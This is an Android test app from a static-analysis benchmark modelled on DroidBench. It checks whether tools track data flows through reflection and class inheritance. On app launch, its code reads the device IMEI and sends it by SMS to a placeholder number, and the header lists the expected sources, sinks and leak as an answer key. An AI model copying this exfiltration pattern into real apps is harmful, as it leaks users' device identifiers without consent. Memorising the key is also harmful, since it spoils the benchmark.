package ubc.yingying.reflection2test2;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;



/**
 * @Description The benchmark is an extension of DroidBench-Reflection-Reflection2.
 *
 * When there are two abstract base classes and several derived class from the base classes,
 * the tool should be able to distinguish which base class the derived class comes from
 *
 * (Specific to this testcase, the tool should know ConcreteClass3 and ConcreteClass4 are derived
 * from BaseClass2, rather than BaseClass1)
 *
 *
 * @ExpectedSources:
 * line 53: getDeviceId()
 * line 57: getDeviceId()
 *
 * @ExpectedSinks:
 * line 54: [leak] sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)
 * line 58: [no leak] sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)
 *
 * @NumberOfExpectedLeaks: 1
 *
 * @FlowPaths:
 * Path1:
 * line 53: bc3.imei = telephonyManager.getDeviceId(); --> 
 * line 54: sms.sendTextMessage("+49 3333", null, bc3.foo(),null,null);  --> leak
 *
 */

public class MainActivity extends Activity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        try {

            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            SmsManager sms = SmsManager.getDefault();


            BaseClass2 bc3 = (BaseClass2) Class.forName("ubc.yingying.reflection2test2.ConcreteClass3").newInstance();
            bc3.imei = telephonyManager.getDeviceId(); // source
            sms.sendTextMessage("+49 3333", null, bc3.foo(),null,null);  // sink, leak

            BaseClass2 bc4 = (BaseClass2) Class.forName("ubc.yingying.reflection2test2.ConcreteClass4").newInstance();
            bc4.imei = telephonyManager.getDeviceId(); // source
            sms.sendTextMessage("+49 4444", null, bc4.foo(), null,null); // sink, no leak

        } catch (InstantiationException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }




}
